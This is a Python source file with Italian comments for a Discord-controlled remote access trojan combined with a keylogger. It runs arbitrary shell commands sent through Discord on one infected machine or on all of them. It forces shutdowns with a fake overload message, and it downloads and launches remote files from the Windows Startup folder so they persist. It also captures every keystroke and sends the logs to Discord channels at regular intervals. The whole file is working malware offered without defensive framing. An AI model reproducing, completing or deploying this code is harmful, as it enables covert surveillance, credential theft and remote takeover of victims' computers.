import discord
import os
import sys
import requests
import keyboard
import asyncio

# Imposta le intenzioni del bot Discord
intents = discord.Intents.default()
intents.message_content = True

# Crea un oggetto cliente Discord
client = discord.Client(intents=intents)

# Ottiene il nome del computer (variabile di ambiente)
COMPUTERNAME = os.getenv("COMPUTERNAME")

# Inserire il token del bot Discord qui
TOKEN = ""

# Canale per il keylogger
keylogger_channel = 0
keylogger_channelTWO = 0

def bot():
    @client.event
    async def on_message(message):
        # Ignora i messaggi inviati dal bot stesso
        if message.author == client.user:
            return

        # Gestisce il comando $help
        if message.content.startswith('$help'):
            embed = discord.Embed(title="Help", color=0x00ff00)
            embed.set_author(name=COMPUTERNAME)
            embed.add_field(name="$computers", value="Mostra tutti i computer connessi!", inline=False)
            await message.channel.send(embed=embed)

        # Gestisce il comando $computers
        if message.content.startswith('$computers'):
            embed = discord.Embed(title=COMPUTERNAME, color=0x00ff00)
            await message.channel.send(embed=embed)

        # Gestisce il comando $cmd
        if message.content.startswith('$cmd'):
            args = list(message.content.split())
            if len(args) >= 1:
                arg1 = args[0]
                print(arg1)
            else:
                arg1 = None
            if len(args) >= 2:
                arg2 = args[1]
                print(arg2)
            else:
                arg2 = None
            if len(args) >= 3:
                arg3 = " ".join(args[2:])
                print(arg3)
            else:
                arg3 = None

            # Gestisce comandi specifici per il computer
            if arg2 == str(COMPUTERNAME):
                if not arg3:
                    embed = discord.Embed(title="Inserire un comando. Digita: $commands", color=0x00ff00)
                    embed.set_author(name=COMPUTERNAME)
                    await message.channel.send(embed=embed)
                    print("--------")

                if arg3 == "exit":
                    embed = discord.Embed(title="Okay, uscita!", color=0x00ff00)
                    embed.set_author(name=COMPUTERNAME)
                    await message.channel.send(embed=embed)
                    print("--------")
                    sys.exit()
                else:
                    embed = discord.Embed(color=0x00ff00)
                    embed.add_field(name="Comando:", value=arg3, inline=False)
                    embed.set_author(name=COMPUTERNAME)
                    await message.channel.send(embed=embed)
                    print("--------")

                    if arg3 == 'dir':
                        b = os.listdir()
                        print(b)
                    elif arg3[:2] == 'cd' and len(arg3) > 3:
                        cd, di = arg3.split(' ')
                        os.chdir(di)
                        b = 'cambiato'
                        print(b)

                    try:
                        os.system(arg3)
                    except:
                        1
            else:
                embed = discord.Embed(title="Inserisci un nome computer corretto. Digita: $computers", color=0x00ff00)
                embed.set_author(name=COMPUTERNAME)
                await message.channel.send(embed=embed)
                print("--------")

            # Gestisce comandi per tutti i computer connessi
            if arg2 == "ALL-COMPUTERS":
                if not arg3:
                    embed = discord.Embed(title="Inserire un comando. Digita: $commands", color=0x00ff00)
                    embed.set_author(name=COMPUTERNAME)
                    await message.channel.send(embed=embed)
                    print("--------")

                if arg3 == "exit":
                    embed = discord.Embed(title="Okay, uscita!", color=0x00ff00)
                    embed.set_author(name=COMPUTERNAME)
                    await message.channel.send(embed=embed)
                    print("--------")
                    sys.exit()
                else:
                    embed = discord.Embed(color=0x00ff00)
                    embed.add_field(name="Comando:", value=arg3, inline=False)
                    embed.set_author(name=COMPUTERNAME)
                    await message.channel.send(embed=embed)
                    print("--------")

                    if arg3 == 'dir':
                        b = os.listdir()
                        print(b)
                    elif arg3[:2] == 'cd' and len(arg3) > 3:
                        cd, di = arg3.split(' ')
                        os.chdir(di)
                        b = 'cambiato'
                        print(b)

                    try:
                        os.system(arg3)
                    except:
                        1

        # Gestisce il comando !computers
        if message.content.startswith('!computers'):
            embed = discord.Embed(color=0x00ff00)
            embed.set_author(name=COMPUTERNAME)
            await message.channel.send(embed=embed)
            print("--------")

        # Gestisce il comando !shutdown
        if message.content.startswith('!shutdown'):
            embed = discord.Embed(title="SHUTDOWN!", color=0x00ff00)
            embed.set_author(name=COMPUTERNAME)
            await message.channel.send(embed=embed)
            print("--------")
            os.system("msg * Sistema sovraccarico! Spegnimento.")
            os.system('shutdown -s -t')

        # Gestisce il comando !download
        if message.content.startswith('!download'):
            args = list(message.content.split())
            if len(args) >= 1:
                arg1 = args[0]
                print(arg1)
            else:
                arg1 = None
            if len(args) >= 2:
                arg2 = args[1]
                print(arg2)
            else:
                arg2 = None
            if len(args) >= 3:
                arg3 = args[2]
                print(arg3)
            else:
                arg3 = None
            if len(args) >= 4:
                arg4 = args[3]
                print(arg4)
            else:
                arg4 = None

            # Gestisce il download di file da URL
            if arg2 == str(COMPUTERNAME):
                if arg3 == "opt:1":
                    if not arg4:
                        embed = discord.Embed(title="Inserire un URL.", color=0x00ff00)
                        embed.set_author(name=COMPUTERNAME)
                        await message.channel.send(embed=embed)
                        print("--------")
                    else:
                        url = str(arg4)
                        response = requests.get(url)
                        if os.name == 'nt':  # Windows
                            filename = os.path.join(os.path.expanduser("~"), 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup', url.split("/")[-1])
                        else:  # Linux
                            filename = os.path.join(os.path.expanduser("~"), 'Downloads', url.split("/")[-1])
                        open(filename, 'wb').write(response.content)
                        embed = discord.Embed(title="Okay, file scaricato. Spero che abbia funzionato:)", color=0x00ff00)
                        embed.set_author(name=COMPUTERNAME)
                        await message.channel.send(embed=embed)
                        print("--------")

                if arg3 == "opt:2":
                    if not arg4:
                        embed = discord.Embed(title="Inserire un URL.", color=0x00ff00)
                        embed.set_author(name=COMPUTERNAME)
                        await message.channel.send(embed=embed)
                        print("--------")
                    else:
                        url = str(arg4)
                        response = requests.get(url)
                        if os.name == 'nt':  # Windows
                            filename = os.path.join(os.path.expanduser("~"), 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup', url.split("/")[-1])
                        else:  # Linux
                            filename = os.path.join(os.path.expanduser("~"), 'Downloads', url.split("/")[-1])
                        open(filename, 'wb').write(response.content)
                        if os.name == 'nt':  # Windows
                            os.system("start " + os.path.join(os.path.expanduser("~"), 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup', url.split("/")[-1]))
                        else:  # Linux
                            os.system(f"xdg-open {filename}")
                        print(filename)
                        embed = discord.Embed(title="Okay, file scaricato e avviato. Spero che abbia funzionato:)", color=0x00ff00)
                        embed.set_author(name=COMPUTERNAME)
                        await message.channel.send(embed=embed)
                        print("--------")

def keybot():
    @client.event
    async def on_ready():
        print('Loggato come')
        print(client.user.name)
        print(client.user.id)
        print('------')
        channel = client.get_channel(keylogger_channel)  # Sostituisci con l'ID del canale in cui desideri inviare i messaggi
        channelTWO = client.get_channel(keylogger_channelTWO)
        print(channel)
        print(channelTWO)
        log = ""
        logPLUS = ""

        async def send_message():
            nonlocal log
            nonlocal logPLUS
            await channel.send(COMPUTERNAME + ": \n\n" + log)
            if len(logPLUS) > 999:
                logPLUS = ""
            await channelTWO.send(COMPUTERNAME + ": \n\n" + logPLUS)
            log = ""
            await asyncio.sleep(20)

        def on_press(key):
            nonlocal log
            nonlocal logPLUS
            if key.name == "backspace":
                log = log[:-1]
                logPLUS = logPLUS[:-1]
            elif key.name == "space":
                log += " "
                logPLUS += " "
            elif key.name == "umschalt":
                log += ""
                logPLUS += ""
            elif key.name == "enter":
                log += "\n"
                logPLUS += "\n"
            elif key.name == "shift":
                log += ""
                logPLUS += ""
            elif key.name == "right shift":
                log += ""
                logPLUS += ""
            elif key.name == "strg":
                log += ""
                logPLUS += ""
            elif key.name == "alt gr":
                log += ""
                logPLUS += ""
            elif key.name == "alt":
                log += ""
                logPLUS += ""
            elif key.name == "nach-rechts":
                log += ""
                logPLUS += ""
            elif key.name == "nach-links":
                log += ""
                logPLUS += ""
            elif key.name == "nach-oben":
                log += ""
                logPLUS += ""
            elif key.name == "nach-unten":
                log += ""
                logPLUS += ""
            elif key.name == "strgv":
                log += ""
                logPLUS += ""
            elif key.name == "strgc":
                log += ""
                logPLUS += ""
            elif key.name == "tab":
                log += "    "
                logPLUS += "    "
            elif key.name == "feststell":
                log += ""
                logPLUS += ""
            else:
                try:
                    log += key.name
                    logPLUS += key.name
                except AttributeError:
                    log += key
                    logPLUS += key
        keyboard.on_press(on_press)
        while True:
            await send_message()

bot()
keybot()
client.run(TOKEN)
